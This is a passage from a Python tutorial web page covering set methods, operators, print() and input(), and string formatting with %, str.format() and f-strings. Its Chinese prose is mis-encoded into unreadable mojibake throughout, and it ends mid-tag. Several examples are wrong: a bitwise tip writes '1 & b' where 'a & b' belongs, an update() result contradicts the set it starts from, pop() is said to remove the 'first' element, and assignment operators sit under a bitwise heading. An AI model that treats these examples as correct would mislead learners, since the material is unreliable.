<p>åŒä¸€é›†åˆä¸­ï¼Œåªèƒ½å­˜å‚¨ä¸å¯å˜çš„æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬æ•´å½¢ã€æµ®ç‚¹å‹ã€å­—ç¬¦ä¸²ã€å…ƒç»„ï¼Œæ— æ³•å­˜å‚¨åˆ—è¡¨ã€å­—å…¸ã€é›†åˆè¿™äº›å¯å˜çš„æ•°æ®ç±»å‹ï¼Œå¦åˆ™ Python è§£é‡Šå™¨ä¼šæŠ›å‡º TypeErroré”™è¯¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;element1,element2,...&#125;</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜ï¼šç”±äºé›†åˆä¸­çš„å…ƒç´ æ˜¯æ— åºçš„ï¼Œå› æ­¤æ— æ³•å‘åˆ—è¡¨é‚£æ ·ä½¿ç”¨ä¸‹æ ‡è®¿é—®å…ƒç´ ï¼Œè®¿é—®é›†åˆå…ƒç´ æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¾ªç¯ç»“æ„ï¼›</p>
<p><strong>é›†åˆå†…ç½®æ–¹æ³•</strong></p>
<table>
<thead>
<tr>
<th><strong>æ–¹æ³•</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
<th><strong>ç»“æœ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>add()</code></td>
<td>å‘é›†åˆæ·»åŠ å…ƒç´ </td>
<td><code>a.add(4)</code></td>
<td><code>&#123;1, 2, 3, 4&#125;</code></td>
</tr>
<tr>
<td><code>update()</code></td>
<td>å‘é›†åˆæ›´æ–°ä¸€ä¸ªé›†åˆ</td>
<td><code>a.update(&#123;3,4,5&#125;) </code></td>
<td><code>&#123;1, 3, 4, 5&#125;</code></td>
</tr>
<tr>
<td><code>remove()</code></td>
<td>åˆ é™¤é›†åˆä¸­çš„å…ƒç´ </td>
<td><code>a.remove(2)</code></td>
<td><code>&#123;1, 3&#125;</code></td>
</tr>
<tr>
<td><code>discard()</code></td>
<td>åˆ é™¤é›†åˆä¸­çš„å…ƒç´ </td>
<td><code>a.discard(2)</code></td>
<td><code>&#123;1, 3&#125;</code></td>
</tr>
<tr>
<td><code>pop()</code></td>
<td>åˆ é™¤é›†åˆç¬¬ä¸€ä¸ªå…ƒç´ </td>
<td><code>a.pop()</code></td>
<td><code>&#123;2,3&#125;</code></td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>æ¸…ç©ºé›†åˆ</td>
<td><code>a.clear()</code></td>
<td><code>&#123;&#125;</code></td>
</tr>
<tr>
<td><code>intersection()</code></td>
<td>è¿”å›ä¸¤ä¸ªé›†åˆçš„äº¤é›†</td>
<td><code>a.intersection(b)</code></td>
<td><code>&#123;3&#125;</code></td>
</tr>
<tr>
<td><code>difference()</code></td>
<td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å·®é›†</td>
<td><code>a.difference(b)</code><br><code>b.difference(a)</code></td>
<td><code>&#123;1,2&#125;</code><br><code>&#123;4,5&#125;</code></td>
</tr>
<tr>
<td><code>symmetric_difference()</code></td>
<td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å¯¹ç§°å·®é›†</td>
<td><code>a.symmetric_difference(b)</code></td>
<td><code>&#123;1, 2, 4, 5&#125;</code></td>
</tr>
<tr>
<td><code>union()</code></td>
<td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å¹¶é›†</td>
<td><code>a.union(b)</code></td>
<td><code>&#123;1, 2, 3, 4, 5&#125;</code></td>
</tr>
</tbody>
</table>
<h2 id="è¿ç®—ç¬¦å·ä»‹ç»">è¿ç®—ç¬¦å·ä»‹ç»</h2>
<h3 id="æ•°è¿ç®—ç¬¦è¯´æ˜">æ•°è¿ç®—ç¬¦è¯´æ˜</h3>
<table>
<thead>
<tr>
<th><strong>è¿ç®—ç¬¦</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
<th><strong>ç»“æœ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>åŠ </td>
<td>1+1</td>
<td>2</td>
</tr>
<tr>
<td>-</td>
<td>å‡</td>
<td>1-1</td>
<td>0</td>
</tr>
<tr>
<td>*</td>
<td>ä¹˜</td>
<td>1*3</td>
<td>3</td>
</tr>
<tr>
<td>/</td>
<td>é™¤æ³•</td>
<td>4/2</td>
<td>2</td>
</tr>
<tr>
<td>//</td>
<td>æ•´é™¤</td>
<td>7 // 2</td>
<td>3</td>
</tr>
<tr>
<td>%</td>
<td>å–ä½™ï¼Œæ±‚æ¨¡ï¼Œå³è¿”å›é™¤æ³•çš„ä½™æ•°</td>
<td>7 % 2</td>
<td>1</td>
</tr>
<tr>
<td>**</td>
<td>å¹‚è¿ç®—/æ¬¡æ–¹è¿ç®—</td>
<td>2 ** 4</td>
<td>16</td>
</tr>
<tr>
<td>|</td>
<td>æˆ–</td>
<td>5|3</td>
<td>7</td>
</tr>
<tr>
<td>&amp;</td>
<td>ä¸</td>
<td>5&amp;3</td>
<td>1</td>
</tr>
<tr>
<td>^</td>
<td>å¼‚æˆ–</td>
<td>5^3</td>
<td>6</td>
</tr>
</tbody>
</table>
<p><font class="notice">Tipsï¼šäº‹å®ä¸Šï¼Œa | b=(1 &amp; b)+(a ^ b)</font></p>
<h3 id="ä½è¿ç®—ç¬¦è¯´æ˜">ä½è¿ç®—ç¬¦è¯´æ˜</h3>
<table>
<thead>
<tr>
<th><strong>è¿ç®—ç¬¦</strong></th>
<th><strong>è¯´ æ˜</strong></th>
<th><strong>ç”¨æ³•ä¸¾ä¾‹</strong></th>
<th><strong>ç­‰ä»·å½¢å¼</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>èµ‹å€¼</td>
<td>x = y</td>
<td>x = y</td>
</tr>
<tr>
<td>+=</td>
<td>åŠ èµ‹å€¼</td>
<td>x += y</td>
<td>x = x + y</td>
</tr>
<tr>
<td>-=</td>
<td>å‡èµ‹å€¼</td>
<td>x -= y</td>
<td>x = x - y</td>
</tr>
<tr>
<td>*=</td>
<td>ä¹˜èµ‹å€¼</td>
<td>x *= y</td>
<td>x = x * y</td>
</tr>
<tr>
<td>/=</td>
<td>é™¤èµ‹å€¼</td>
<td>x /= y</td>
<td>x = x / y</td>
</tr>
<tr>
<td>%=</td>
<td>å–ä½™æ•°èµ‹å€¼</td>
<td>x %= y</td>
<td>x = x % y</td>
</tr>
<tr>
<td>**=</td>
<td>å¹‚èµ‹å€¼</td>
<td>x **= y</td>
<td>x = x ** y</td>
</tr>
<tr>
<td>//=</td>
<td>å–æ•´æ•°èµ‹å€¼</td>
<td>x //= y</td>
<td>x = x // y</td>
</tr>
<tr>
<td>&amp;=</td>
<td>æŒ‰ä½ä¸èµ‹å€¼</td>
<td>x &amp;= y</td>
<td>x = x &amp; y</td>
</tr>
<tr>
<td>|=</td>
<td>æŒ‰ä½æˆ–èµ‹å€¼</td>
<td>x |= y</td>
<td>x = x | y</td>
</tr>
<tr>
<td>^=</td>
<td>æŒ‰ä½å¼‚æˆ–èµ‹å€¼</td>
<td>x ^= y</td>
<td>x = x ^ y</td>
</tr>
<tr>
<td>&lt;&lt;=</td>
<td>å·¦ç§»èµ‹å€¼</td>
<td>x Â«= y</td>
<td>x = x &lt;&lt; yï¼Œ y æŒ‡å·¦ç§»ä½æ•°</td>
</tr>
<tr>
<td>&gt;&gt;=</td>
<td>å³ç§»èµ‹å€¼</td>
<td>x Â»= y</td>
<td>x = x &gt;&gt; yï¼Œ y æŒ‡å³ç§»ä½æ•°</td>
</tr>
</tbody>
</table>
<h3 id="æ¯”è¾ƒè¿ç®—ç¬¦è¯´æ˜">æ¯”è¾ƒè¿ç®—ç¬¦è¯´æ˜</h3>
<table>
<thead>
<tr>
<th><strong>æ¯”è¾ƒè¿ç®—ç¬¦</strong></th>
<th><strong>è¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>å¤§äº</td>
</tr>
<tr>
<td>&lt;</td>
<td>å°äº</td>
</tr>
<tr>
<td>==</td>
<td>ç­‰äº</td>
</tr>
<tr>
<td>&gt;=</td>
<td>å¤§äºç­‰äºï¼ˆç­‰ä»·äºæ•°å­¦ä¸­çš„ â‰¥ï¼‰</td>
</tr>
<tr>
<td>&lt;=</td>
<td>å°äºç­‰äºï¼ˆç­‰ä»·äºæ•°å­¦ä¸­çš„ â‰¤ï¼‰</td>
</tr>
<tr>
<td>!=</td>
<td>ä¸ç­‰äºï¼ˆç­‰ä»·äºæ•°å­¦ä¸­çš„ â‰ ï¼‰</td>
</tr>
<tr>
<td>is</td>
<td>åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ‰€å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç›¸åŒ</td>
</tr>
<tr>
<td>is not</td>
<td>åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ‰€å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ä¸ç›¸åŒ</td>
</tr>
</tbody>
</table>
<h3 id="é€»è¾‘è¿ç®—ç¬¦è¯´æ˜">é€»è¾‘è¿ç®—ç¬¦è¯´æ˜</h3>
<table>
<thead>
<tr>
<th><strong>é€»è¾‘è¿ç®—ç¬¦</strong></th>
<th><strong>å«ä¹‰</strong></th>
<th><strong>åŸºæœ¬æ ¼å¼</strong></th>
<th><strong>è¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>ä¸è¿ç®—</td>
<td>x and y</td>
<td>å½“xå’Œyéƒ½ä¸ºçœŸæ—¶ç»“æœæ‰ä¸ºçœŸã€‚</td>
</tr>
<tr>
<td>or</td>
<td>æˆ–è¿ç®—</td>
<td>x or y</td>
<td>å½“xå’Œyéƒ½ä¸ºå‡æ—¶ç»“æœæ‰æ˜¯å‡ã€‚</td>
</tr>
<tr>
<td>not</td>
<td>éè¿ç®—</td>
<td>not y</td>
<td>å¯¹xçš„ç»“æœå–ç›¸åçš„ç»“æœã€‚</td>
</tr>
</tbody>
</table>
<h3 id="æˆå‘˜è¿ç®—ç¬¦è¯´æ˜">æˆå‘˜è¿ç®—ç¬¦è¯´æ˜</h3>
<p>inå’Œnot inç”¨äºæµ‹è¯•ç»™å®šæ•°æ®æ˜¯å¦å­˜åœ¨äºåºåˆ—ï¼ˆå¦‚åˆ—è¡¨ã€å­—ç¬¦ä¸²ï¼‰ä¸­ï¼š</p>
<p>inä½œç”¨æ˜¯ï¼Œå¦‚æœæŒ‡å®šå­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œåˆ™è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseã€‚not inçš„ä½œç”¨åˆšå¥½ç›¸åã€‚</p>
<p>ç¼–å†™è¿ç®—ç¬¦åº”ç”¨ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">&quot;zkrc&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="built_in">print</span>(y <span class="keyword">in</span> x)</span><br><span class="line"><span class="built_in">print</span>(y <span class="keyword">not</span> <span class="keyword">in</span> x)</span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h2 id="è¾“å…¥è¾“å‡ºåº”ç”¨">è¾“å…¥è¾“å‡ºåº”ç”¨</h2>
<h3 id="è¾“å…¥è¾“å‡ºå‡½æ•°è¯´æ˜">è¾“å…¥è¾“å‡ºå‡½æ•°è¯´æ˜</h3>
<h4 id="print-å‡½æ•°">print()å‡½æ•°</h4>
<p>print()å‡½æ•°ç”¨äºæ‰“å°å†…å®¹æˆ–å˜é‡ç­‰è¾“å‡ºï¼Œæ˜¯pythonä¸­æœ€æœ€ç”¨çš„å‡½æ•°ã€‚</p>
<p>å‡½æ•°è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(value1, ..., sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=sys.stdout,flush=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°å‚æ•°ä¿¡æ¯ï¼š</p>
<table>
<thead>
<tr>
<th><strong>åºå·</strong></th>
<th><strong>å‡½æ•°å‚æ•°</strong></th>
<th><strong>è§£é‡Šè¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td>value</td>
<td>æ‰“å°çš„å¯¹è±¡ï¼Œä¹‹é—´ç”¨é€—å·åˆ†éš”</td>
</tr>
<tr>
<td>02</td>
<td>sep</td>
<td>æ‰“å°çš„ä¸¤ä¸ªå€¼ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼</td>
</tr>
<tr>
<td>03</td>
<td>end</td>
<td>æ‰“å°è¾“å‡ºä»¥ä»€ä¹ˆç»“å°¾ï¼Œé»˜è®¤æ˜¯æ¢è¡Œç¬¦\n</td>
</tr>
<tr>
<td>04</td>
<td>file</td>
<td>è¾“å‡ºçš„æ–‡ä»¶å¯¹è±¡ï¼Œé»˜è®¤æ˜¯sys.stdoutï¼Œæ ‡å‡†è¾“å‡º</td>
</tr>
<tr>
<td>05</td>
<td>flush</td>
<td>è¡¨ç¤ºè¦å¼ºåˆ¶å†²æ´—æµï¼ˆå¿½ç•¥ï¼‰</td>
</tr>
</tbody>
</table>
<p>print() å‡½æ•°ä½¿ç”¨ä»¥%å¼€å¤´çš„è½¬æ¢è¯´æ˜ç¬¦å¯¹å„ç§ç±»å‹çš„æ•°æ®è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºï¼Œå…·ä½“è¯·çœ‹ä¸‹è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>ç±»å‹</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%s</code></td>
<td>å­—ç¬¦ä¸²</td>
<td><code>&quot;Hello %s&quot; % &quot;World&quot;</code></td>
</tr>
<tr>
<td><code>%d</code></td>
<td>æ•´æ•°</td>
<td><code>&quot;Age: %d&quot; % 25</code></td>
</tr>
<tr>
<td><code>%f</code>ã€<code>%F</code></td>
<td>æµ®ç‚¹æ•°</td>
<td><code>&quot;Price: %.2f&quot; % 99.876</code> â†’ <code>99.88</code></td>
</tr>
<tr>
<td><code>%x</code></td>
<td>åå…­è¿›åˆ¶æ•´æ•°</td>
<td><code>&quot;Hex: %x&quot; % 255</code> â†’ <code>ff</code></td>
</tr>
<tr>
<td><code>%%</code></td>
<td>ç™¾åˆ†å·æœ¬èº«</td>
<td><code>&quot;Discount: 10%%&quot;</code></td>
</tr>
</tbody>
</table>
<p>ä»£ç æ“ä½œç¤ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">sex = <span class="string">&quot;Male&quot;</span></span><br><span class="line">age = <span class="number">24</span></span><br><span class="line"><span class="built_in">print</span>(name, sex, sep=<span class="string">&quot;:&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(age)  <span class="comment"># Corazon:Male 24  ä¸ä¸Šè¡Œåˆå¹¶ä¸ºåŒä¸€è¡Œ</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ä½ çš„åå­—æ˜¯:&quot;</span>, name, <span class="string">&quot;ä½ çš„æ€§åˆ«ï¼š&quot;</span>, sex, <span class="string">&quot;ä½ çš„å¹´é¾„&quot;</span>, age)  <span class="comment"># ä½ çš„åå­—æ˜¯: Corazon ä½ çš„æ€§åˆ«ï¼š Male ä½ çš„å¹´é¾„ 24</span></span><br><span class="line"><span class="comment"># è§£å†³ç©ºæ ¼é—®é¢˜</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ä½ çš„åå­—æ˜¯:&quot;</span>, name, <span class="string">&quot; ä½ çš„æ€§åˆ«ï¼š&quot;</span>, sex, <span class="string">&quot; ä½ çš„å¹´é¾„&quot;</span>, age, sep=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># ä½ çš„åå­—æ˜¯:Corazon ä½ çš„æ€§åˆ«ï¼šMale ä½ çš„å¹´é¾„24</span></span><br><span class="line"><span class="comment"># åŒæ—¶è¾“å‡ºå­—ç¬¦ä¸²å’Œå˜é‡ï¼Œç”¨+æ‹¼æ¥</span></span><br><span class="line">info = <span class="string">&quot;ä½ çš„åå­—æ˜¯:&quot;</span> + name</span><br><span class="line"><span class="built_in">print</span>(info)  <span class="comment"># ä½ çš„åå­—æ˜¯:Corazon</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##Printæ ¼å¼åŒ–è¾“å‡º</span></span><br><span class="line"><span class="comment"># æ–¹æ³•1ï¼š&#123;0&#125;ã€&#123;1&#125;ã€&#123;2&#125;åˆ†åˆ«è¡¨ç¤ºj,i,j+iï¼Œå•å¼•å·é‡Œé¢æ˜¯è¾“å‡ºæ ¼å¼ã€‚</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ä½ çš„åå­—æ˜¯&#123;0&#125;,ä½ çš„æ€§åˆ«:&#123;1&#125;,ä½ çš„å¹´é¾„:&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(name, sex, age))  <span class="comment"># ä½ çš„åå­—æ˜¯Corazon,ä½ çš„æ€§åˆ«:Male,ä½ çš„å¹´é¾„:24</span></span><br><span class="line"><span class="comment"># æ–¹æ³•2ï¼šç±»ä¼¼äºCè¯­è¨€æ ¼å¼è¾“å‡ºï¼Œä½¿ç”¨%å¼€å¤´æ ¼å¼è¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ä½ çš„åå­—æ˜¯%s,ä½ çš„æ€§åˆ«:%s,ä½ çš„å¹´é¾„:%s&quot;</span> % (name, sex, age))  <span class="comment"># ä½ çš„åå­—æ˜¯Corazon,ä½ çš„æ€§åˆ«:Male,ä½ çš„å¹´é¾„:24</span></span><br></pre></td></tr></table></figure>
<h4 id="input-å‡½æ•°">input()å‡½æ•°</h4>
<p>inputå‡½æ•°æ˜¯ç”¨æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ã€‚å¦‚æœæƒ³è¦å¾—åˆ°å…¶ä»–ç±»å‹çš„æ•°æ®è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬åŒ–ã€‚ä»£ç æ“ä½œç¤ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…è®¸ç”¨æˆ·åœ¨ç»ˆç«¯ä¸‹è¾“å…¥è‡ªå·±çš„è´¦å·å’Œå¯†ç </span></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨çš„å§“åï¼š&quot;</span>)</span><br><span class="line">year = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿå¹´ï¼š&quot;</span>))</span><br><span class="line">month = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿæœˆï¼š&quot;</span>))</span><br><span class="line">day = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿæ—¥ï¼š&quot;</span>))</span><br><span class="line"><span class="comment"># å‰é¢åŒå¼•å·å†…å®¹æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ%så°±æ˜¯å ä½ç¬¦ï¼Œå æ®ä¸€ä¸ªä½ç½®ï¼Œç±»ä¼¼æ•™å®¤å åº§ã€‚</span></span><br><span class="line"><span class="comment"># å ä½ç¬¦%sæœ€ç»ˆä¼šè¢«åé¢çš„å˜é‡çš„å€¼æ‰€æ›¿ä»£ã€‚</span></span><br><span class="line"><span class="comment"># ä¸­é—´çš„`%`æ˜¯ä¸€ä¸ªåˆ†éš”ç¬¦ã€‚</span></span><br><span class="line"><span class="comment"># å¤šä¸ªå˜é‡è¡¨è¾¾å¼å¿…é¡»ä½¿ç”¨å°æ‹¬å·æ‰©èµ·æ¥ã€‚</span></span><br><span class="line"><span class="comment"># %02d ä»¥æ•´æ•°è¾“å‡ºï¼Œå¦‚æœä¸è¶³2ä½æ•´æ•°çš„ï¼Œå·¦è¾¹åŠ 0è¡¥å……è¿›å»</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ‚¨å¥½%sï¼Œæ‚¨çš„å‡ºç”Ÿæ—¥æœŸä¸ºï¼š%d-%02d-%02d&quot;</span> % (name,year, month, day))</span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">è¯·è¾“å…¥æ‚¨çš„å§“åï¼šCorazon</span><br><span class="line">è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿå¹´ï¼š<span class="number">2000</span></span><br><span class="line">è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿæœˆï¼š<span class="number">6</span></span><br><span class="line">è¯·è¾“å…¥æ‚¨çš„å‡ºç”Ÿæ—¥ï¼š<span class="number">8</span></span><br><span class="line">æ‚¨å¥½Corazonï¼Œæ‚¨çš„å‡ºç”Ÿæ—¥æœŸä¸ºï¼š<span class="number">2000</span>-06-08</span><br></pre></td></tr></table></figure>
<h3 id="æ ¼å¼åŒ–è¾“å‡º">æ ¼å¼åŒ–è¾“å‡º</h3>
<p>è¯ä¸å¤šè¯´</p>
<h4 id="æ ¼å¼åŒ–ï¼ˆä¼ ç»Ÿæ–¹æ³•ï¼‰"><code>%</code> æ ¼å¼åŒ–ï¼ˆä¼ ç»Ÿæ–¹æ³•ï¼‰</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: %s, Age: %d&quot;</span> % (name, age))  <span class="comment"># Name: Alice, Age: 30</span></span><br></pre></td></tr></table></figure>
<p><strong>é«˜çº§æ§åˆ¶ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®½åº¦ä¸å¯¹é½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[%10s]&quot;</span> % <span class="string">&quot;left&quot;</span>)    <span class="comment"># å³å¯¹é½ï¼š[      left]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[%-10s]&quot;</span> % <span class="string">&quot;right&quot;</span>)  <span class="comment"># å·¦å¯¹é½ï¼š[right     ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ®ç‚¹æ•°ç²¾åº¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ï€: %.03f&quot;</span> % <span class="number">3.14159</span>)  <span class="comment"># Ï€: 3.142</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a: %010.03f&quot;</span> % <span class="number">1.23456</span>)  <span class="comment"># a: 000001.235</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a: %.010f&quot;</span> % <span class="number">1.23456</span>)  <span class="comment"># a: 1.2345600000</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="str-format-æ–¹æ³•"><strong><code>str.format()</code> æ–¹æ³•</strong></h4>
<p>Python 2.6+ç‰ˆæœ¬æ”¯æŒstr.format()` æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &#123;0&#125;, Age: &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">40</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;Bob&quot;</span>, age=<span class="number">40</span>))</span><br><span class="line">num=<span class="built_in">input</span>(<span class="string">&quot;ä½ è¿˜æœ‰&#123;0&#125;æ¬¡æœºä¼šï¼Œ\nè¯·è¾“å…¥ä¸€ä¸ª1åˆ°20çš„æ•´æ•°ï¼š&quot;</span>.<span class="built_in">format</span>(<span class="number">5</span>-count))</span><br></pre></td></tr></table></figure>
<p><strong>æ ¸å¿ƒåŠŸèƒ½ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ä½ç½®å‚æ•°</strong><br>
<code>&quot;&#123;0&#125; + &#123;1&#125; = &#123;2&#125;&quot;.format(1, 2, 3)</code> â†’ <code>1 + 2 = 3</code></p>
</li>
<li class="lvl-2">
<p><strong>å…³é”®å­—å‚æ•°</strong><br>
<code>&quot;User: &#123;username&#125;&quot;.format(username=&quot;admin&quot;)</code></p>
</li>
<li class="lvl-2">
<p><strong>æ··åˆä½¿ç”¨</strong><br>
<code>&quot;&#123;0&#125; &#123;last&#125;&quot;.format(&quot;John&quot;, last=&quot;Doe&quot;)</code></p>
</li>
</ul>
<h4 id="æ ¼å¼åŒ–è§„èŒƒï¼ˆ-åå®šä¹‰æ ¼å¼ï¼‰ï¼š"><strong>æ ¼å¼åŒ–è§„èŒƒï¼ˆ<code>:</code> åå®šä¹‰æ ¼å¼ï¼‰ï¼š</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ•°å­—æ ¼å¼åŒ–</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ï€: &#123;:.3f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159</span>))      <span class="comment"># Ï€: 3.142</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hex: &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">255</span>))          <span class="comment"># ff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡æœ¬å¯¹é½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&#123;:&gt;10&#125;]&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;right&quot;</span>))       <span class="comment"># [     right]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&#123;:^10&#125;]&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;center&quot;</span>))      <span class="comment"># [  center  ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¦å·æ˜¾ç¤º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Balance: &#123;:+d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">100</span>))     <span class="comment"># +100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åƒä½åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1000000</span>))           <span class="comment"># 1,000,000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™¾åˆ†æ¯”</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ratio: &#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">0.25</span>))     <span class="comment"># 25.00%</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="f-strings"><strong><code>f-strings</code></strong></h4>
<p>Python 3.6+ï¼Œæ¨èã€‚åœ¨æ¸—é€æµ‹è¯•Pythonè„šæœ¬ä¸­ç»å¸¸ä½¿ç”¨<code>f-strings</code>æ–¹å¼æ„å»ºPayLoad</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>&quot;</span>)  <span class="comment"># Name: Corazon, Age: 35</span></span><br></pre></td></tr></table></figure>
<p><strong>é«˜çº§ç‰¹æ€§ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¡¨è¾¾å¼è®¡ç®—</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sum: <span class="subst">&#123;<span class="number">5</span> + <span class="number">3</span>&#125;</span>&quot;</span>)                <span class="comment"># Sum: 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Uppercase: <span class="subst">&#123;<span class="string">&#x27;hello&#x27;</span>.upper()&#125;</span>&quot;</span>)  <span class="comment"># Uppercase: HELLO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¼å¼æ§åˆ¶</span></span><br><span class="line">pi = <span class="number">3.14159</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Ï€: <span class="subst">&#123;pi:<span class="number">.3</span>f&#125;</span>&quot;</span>)                 <span class="comment"># Ï€: 3.142 ä¸%æ ¼å¼ä¸€æ ·</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hex: <span class="subst">&#123;<span class="number">255</span>:x&#125;</span>, int: <span class="subst">&#123;<span class="number">0b11111111</span>:d&#125;</span>, Oct: <span 